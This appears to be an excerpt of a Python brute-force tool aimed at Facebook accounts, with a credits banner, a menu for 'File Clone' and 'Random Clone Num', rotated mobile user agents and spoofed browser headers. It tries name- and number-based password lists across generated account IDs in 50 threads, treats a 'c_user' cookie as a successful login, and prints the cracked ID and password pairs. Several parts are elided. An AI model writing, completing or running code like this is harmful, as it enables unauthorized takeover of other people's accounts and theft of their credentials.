...
syed =[
'Mozilla/5.0 (Linux; Android 12; CPH2219) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36',
...
##     ## ##     ## ########  
--------------------------------------------------
[+] Owner = Raham Abbas Baloch
[+] Facebook = Raham Abbas
[+] Whatsapp = 03*********
[+] Thank Alot = Yousif Baloch 
--------------------------------------------------""")
def linex():
	print('\033[1;37m--------------------------------------------------')
loop = 0
...
def fia():    
			print(logo)
			print('\x1b[1;92m Tumhare Okat Nahi Hum Sa Barabri Karna Ke \x1b[1;92m ')
			linex()
			print('Tool Version 0.0.1/Date = Fri/27/Jan')
			print('Whats Is New = Update Methode 1  ')
			linex()
			print('[1] File Clone\n[2] Rendom Clone Num\n[3] Creat File\n[E] Exit')
			linex()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[RAB] %s|\033[1;32mOK=%s \033[1;92m'%(loop,len(cps)));sys.stdout.flush()
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[RAB] %s|\033[1;32mOK=%s \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in RAB:
				...
				print('\r\r\033[1;32m[RAB-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[RAB-CP] %s | %s'%(ids,pas))
...
def random_number1():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		print('If You No Result Use Flight Mode ')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode]
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mAWAD\033[1;97m] %s|OK=%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
    ...
    'sec-ch-ua': '"Chromium";v="105", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    ...
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; Infinix X688B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[RAB-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[RAB-OK] '+cid+' | '+ps+'\33[0;97m')
